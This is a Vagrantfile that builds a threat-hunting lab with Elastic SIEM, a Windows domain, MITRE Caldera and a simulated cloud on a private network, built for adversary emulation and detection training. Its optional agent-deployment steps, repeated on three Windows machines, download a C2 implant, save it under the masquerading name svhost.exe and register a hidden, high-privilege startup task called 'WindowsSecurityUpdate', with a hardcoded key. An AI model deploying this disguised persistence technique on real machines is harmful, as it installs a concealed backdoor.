# Vagrantfile
# Threat Hunting Lab: Elastic SIEM + Windows Domain + MITRE Caldera + Local Cloud Sim
#
# VM inventory:
#   192.168.56.10  elastic-siem   Ubuntu 22.04  — Elasticsearch, Kibana, Fleet
#   192.168.56.20  win11-victim   Windows 11    — Victim workstation
#   192.168.56.30  caldera        Ubuntu 22.04  — MITRE Caldera C2
#   192.168.56.40  cloud-sim      Ubuntu 22.04  — LocalStack + CloudTrail + Filebeat
#   192.168.56.50  win-dc         WinSrv 2022   — Active Directory DC (lab.local)
#   192.168.56.51  win-server     WinSrv 2022   — Domain member server
#
# Provisioning order (handled automatically by setup.sh):
#   1. elastic-siem   — writes fleet-enrollment-token.txt
#   2. caldera        — C2 must be up before Windows agents are deployed
#   3. cloud-sim      — independent of Windows domain
#   4. win-dc         — writes domain-info.txt (depends on elastic-siem)
#   5. win-server     — depends on elastic-siem + win-dc
#   6. win11-victim   — depends on elastic-siem
#
# Optional after full provisioning:
#   vagrant provision win11-victim --provision-with join_domain   (domain-join the victim)
#   vagrant provision <vm>         --provision-with deploy_caldera_agent
#
# Manual launch:
#   vagrant up --no-parallel

Vagrant.configure("2") do |config|

  # Disable automatic box update checks for reproducibility
  config.vm.box_check_update = false

  # ── Elastic SIEM ──────────────────────────────────────────────────────────
  config.vm.define "elastic-siem" do |elastic|
    elastic.vm.box      = "bento/ubuntu-22.04"
    elastic.vm.hostname = "elastic-siem"
    elastic.vm.network  "private_network", ip: "192.168.56.10"

    elastic.vm.provider "vmware_desktop" do |v|
      v.memory = 8192
      v.cpus   = 4
      v.vmx["displayname"] = "elastic-siem"
      v.gui = false
      v.linked_clone = false
    end

    elastic.vm.provision "shell", path: "scripts/install_elastic.sh"
  end

  # ── MITRE Caldera ─────────────────────────────────────────────────────────
  # Provisioned before win11-victim so the C2 is ready when the agent
  # is deployed, though it has no ordering dependency on elastic-siem.
  config.vm.define "caldera" do |cal|
    cal.vm.box      = "bento/ubuntu-22.04"
    cal.vm.hostname = "caldera"
    cal.vm.network  "private_network", ip: "192.168.56.30"

    cal.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"] = "caldera"
      v.gui = false
      v.linked_clone = false
    end

    cal.vm.provision "shell", path: "scripts/install_caldera.sh"
  end

  # ── Local Cloud Simulator (LocalStack + CloudTrail + Filebeat) ───────────
  config.vm.define "cloud-sim" do |cloud|
    cloud.vm.box      = "bento/ubuntu-22.04"
    cloud.vm.hostname = "cloud-sim"
    cloud.vm.network  "private_network", ip: "192.168.56.40"

    cloud.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"] = "cloud-sim"
      v.gui = false
      v.linked_clone = false
    end

    cloud.vm.provision "shell", path: "scripts/install_cloud_sim.sh"
  end
  # ── Windows Domain Controller ──────────────────────────────────────────────────
  # Provision AFTER elastic-siem (needs fleet-enrollment-token.txt).
  # Two-stage provisioning: setup_dc.ps1 promotes the DC, Vagrant reboots,
  # then setup_dc_post_reboot.ps1 creates users/OUs and installs Sysmon + Elastic Agent.
  config.vm.define "win-dc" do |dc|
    dc.vm.box          = "gusztavvargadr/windows-server-2022"
    dc.vm.hostname     = "win-dc"
    dc.vm.communicator = "winrm"
    dc.vm.network       "private_network", ip: "192.168.56.50"
    dc.vm.boot_timeout = 600

    # Give WinRM extra retries — DC promotion reboot takes longer than a normal reboot
    dc.winrm.retry_limit = 60
    dc.winrm.retry_delay = 15

    dc.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"]             = "win-dc"
      v.vmx["uefi.secureBoot.enabled"] = "FALSE"
      v.gui                = false
      v.force_vmware_license = "workstation"
      v.linked_clone       = true
    end

    # Guard: elastic-siem must be provisioned first
    dc.vm.provision "shell", privileged: false, inline: <<~POWERSHELL
      if (-not (Test-Path "C:\\vagrant\\fleet-enrollment-token.txt")) {
        Write-Error "fleet-enrollment-token.txt not found. Run 'vagrant up elastic-siem' first."
        exit 1
      }
    POWERSHELL

    # Stage 1: Install AD DS role and promote to DC; Vagrant reboots after
    dc.vm.provision "shell", name: "setup_dc", reboot: true, privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_dc.ps1"
    POWERSHELL

    # Stage 2: Post-reboot — create OUs/users, write domain-info.txt, install Sysmon + Elastic Agent
    dc.vm.provision "shell", name: "setup_dc_post_reboot", privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_dc_post_reboot.ps1"
    POWERSHELL

    # Deploy Caldera sandcat agent (run manually after lab is fully up)
    dc.vm.provision "shell", name: "deploy_caldera_agent", run: "never", privileged: false, inline: <<~'POWERSHELL'
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /change hibernate-timeout-ac 0 | Out-Null
      $CalderaServer = "http://192.168.56.30:8888"
      $SandcatPath   = "C:\Users\Public\svhost.exe"
      $TaskName      = "WindowsSecurityUpdate"
      $existingTask  = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
      if ($existingTask) {
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      }
      Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      & curl.exe -fsSL -o $SandcatPath -H "file: sandcat.go-windows" -H "KEY: ADMIN123" "$CalderaServer/file/download" 2>$null
      if ($LASTEXITCODE -ne 0) { Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"; exit 1 }
      $Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
      $Trigger  = New-ScheduledTaskTrigger -AtStartup
      $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force | Out-Null
      Start-ScheduledTask -TaskName $TaskName
      Write-Host "[caldera-agent] Done."
      exit 0
    POWERSHELL
  end

  # ── Windows Member Server ──────────────────────────────────────────────────────
  # Provision AFTER elastic-siem (Fleet token) AND win-dc (domain-info.txt).
  # Two-stage provisioning: setup_win_server.ps1 joins the domain, Vagrant reboots,
  # then setup_win_server_tools.ps1 installs Sysmon and Elastic Agent.
  config.vm.define "win-server" do |srv|
    srv.vm.box          = "gusztavvargadr/windows-server-2022"
    srv.vm.hostname     = "win-server"
    srv.vm.communicator = "winrm"
    srv.vm.network       "private_network", ip: "192.168.56.51"
    srv.vm.boot_timeout = 600

    srv.winrm.retry_limit = 30
    srv.winrm.retry_delay = 10

    srv.vm.provider "vmware_desktop" do |v|
      v.memory = 2048
      v.cpus   = 2
      v.vmx["displayname"]             = "win-server"
      v.vmx["uefi.secureBoot.enabled"] = "FALSE"
      v.gui                = false
      v.force_vmware_license = "workstation"
      v.linked_clone       = true
    end

    # Guard: elastic-siem AND win-dc must be provisioned first
    srv.vm.provision "shell", privileged: false, inline: <<~POWERSHELL
      if (-not (Test-Path "C:\\vagrant\\fleet-enrollment-token.txt")) {
        Write-Error "fleet-enrollment-token.txt not found. Run 'vagrant up elastic-siem' first."
        exit 1
      }
      if (-not (Test-Path "C:\\vagrant\\domain-info.txt")) {
        Write-Error "domain-info.txt not found. Run 'vagrant up win-dc' first."
        exit 1
      }
    POWERSHELL

    # Stage 1: Configure network and join domain; Vagrant reboots after
    srv.vm.provision "shell", name: "setup_win_server", reboot: true, privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_win_server.ps1"
    POWERSHELL

    # Stage 2: Post-reboot — install Sysmon and Elastic Agent
    srv.vm.provision "shell", name: "setup_win_server_tools", privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_win_server_tools.ps1"
    POWERSHELL

    # Deploy Caldera sandcat agent (run manually after lab is fully up)
    srv.vm.provision "shell", name: "deploy_caldera_agent", run: "never", privileged: false, inline: <<~'POWERSHELL'
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /change hibernate-timeout-ac 0 | Out-Null
      $CalderaServer = "http://192.168.56.30:8888"
      $SandcatPath   = "C:\Users\Public\svhost.exe"
      $TaskName      = "WindowsSecurityUpdate"
      $existingTask  = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
      if ($existingTask) {
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      }
      Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      & curl.exe -fsSL -o $SandcatPath -H "file: sandcat.go-windows" -H "KEY: ADMIN123" "$CalderaServer/file/download" 2>$null
      if ($LASTEXITCODE -ne 0) { Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"; exit 1 }
      $Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
      $Trigger  = New-ScheduledTaskTrigger -AtStartup
      $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force | Out-Null
      Start-ScheduledTask -TaskName $TaskName
      Write-Host "[caldera-agent] Done."
      exit 0
    POWERSHELL
  end
  # ── Windows 11 Victim ─────────────────────────────────────────────────────
  # Must be provisioned AFTER elastic-siem writes fleet-enrollment-token.txt
  config.vm.define "win11-victim" do |win|
    win.vm.box              = "gusztavvargadr/windows-11"
    win.vm.hostname         = "win11-victim"
    win.vm.communicator     = "winrm"
    win.vm.network          "private_network", ip: "192.168.56.20"
    win.vm.boot_timeout     = 600   # Windows 11 boot can exceed the 300s default

    win.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"]              = "win11-victim"
      v.vmx["uefi.secureBoot.enabled"]  = "FALSE"
      v.gui = false
      # Force Workstation product type so vmrun uses -T ws (not -T player).
      # The utility reports "standard" license, which the plugin maps to "player"
      # mode (disabling snapshots). "workstation" forces @pro_license = true,
      # enabling vmrun -T ws + linked clone (Issues 4 and 27).
      v.force_vmware_license = "workstation"
      v.linked_clone = true
    end

    # Abort early with a clear message if elastic-siem hasn't been provisioned yet
    win.vm.provision "shell", inline: <<~POWERSHELL, privileged: false
      if (-not (Test-Path "C:\\vagrant\\fleet-enrollment-token.txt")) {
        Write-Error "fleet-enrollment-token.txt not found. Run 'vagrant up elastic-siem' first."
        exit 1
      }
    POWERSHELL

    # Run script from shared folder — avoids WinRM file-upload bug in vagrant-vmware-desktop
    win.vm.provision "shell", name: "install_win_tools", privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\install_win_tools.ps1"
    POWERSHELL

    # Optional: domain-join win11-victim to lab.local
    # Run after win-dc is fully provisioned:
    #   vagrant provision win11-victim --provision-with join_domain
    win.vm.provision "shell", name: "join_domain", run: "never", reboot: true, privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\join_domain.ps1"
    POWERSHELL

    # Deploy Caldera sandcat agent (can be re-run independently)
    win.vm.provision "shell", name: "deploy_caldera_agent", run: "never", privileged: false, inline: <<~'POWERSHELL'
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /change hibernate-timeout-ac 0 | Out-Null
      $CalderaServer = "http://192.168.56.30:8888"
      $SandcatPath   = "C:\Users\Public\svhost.exe"
      $TaskName      = "WindowsSecurityUpdate"
      $existingTask  = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
      if ($existingTask) {
        Write-Host "[caldera-agent] Stopping existing task before re-download..."
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      }
      Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      Write-Host "[caldera-agent] Downloading sandcat..."
      & curl.exe -fsSL -o $SandcatPath -H "file: sandcat.go-windows" -H "KEY: ADMIN123" "$CalderaServer/file/download" 2>$null
      if ($LASTEXITCODE -ne 0) { Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"; exit 1 }
      Write-Host "[caldera-agent] Registering scheduled task..."
      $Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
      $Trigger  = New-ScheduledTaskTrigger -AtStartup
      $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force | Out-Null
      Write-Host "[caldera-agent] Starting sandcat via scheduled task (survives WinRM close)..."
      Start-ScheduledTask -TaskName $TaskName
      Write-Host "[caldera-agent] Done."
      exit 0
    POWERSHELL
  end

end
